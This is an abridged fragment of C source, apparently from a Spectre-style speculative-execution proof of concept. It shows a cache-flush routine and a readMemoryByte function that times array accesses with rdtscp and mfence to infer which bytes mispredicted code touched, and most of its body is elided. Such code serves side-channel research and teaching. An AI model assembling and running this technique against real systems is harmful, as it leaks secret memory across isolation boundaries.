...
/* From
 * https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27
 */
/**
...
void flush_memory_sse(uint8_t *addr) {
    ...
    for (k = 0; k < 4; k++)
        for (l = 0; l < 4; l++) _mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif
...
void readMemoryByte(int cache_hit_threshold, size_t malicious_x,
    ...
    for (tries = 999; tries > 0; tries--) {
        ...
        for (j = 0; j < 16; j++)
            for (i = 0; i < 256; i++) flush_memory_sse(&array2[i * 512]);
#endif
        ...
        for (j = 29; j >= 0; j--) {
            ...
            for (l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0;
                 l -= CACHE_FLUSH_STRIDE) {
        ...
        for (i = 0; i < 256; i++) {
            ...
            /*
            We need to accuratly measure the memory access to the current index
            of the array so we can determine which index was cached by the
            malicious mispredicted code. The best way to do this is to use the
            rdtscp instruction, which measures current processor ticks, and is
            also serialized.
            */
...
#ifndef NOMFENCE
            /*
            Since the rdstc instruction isn't serialized, newer processors will
            try to reorder it, ruining its value as a timing mechanism. To get
            around this, we use the mfence instruction to introduce a memory
            barrier and force serialization. mfence is used because it is
            portable across Intel and AMD.
            */
            ...
            so we have to ifdef it out on pre-SSE2 processors. Luckily, these
            older processors don't seem to reorder the rdtsc instruction, so not
            having mfence on older processors is less of an issue.
            */
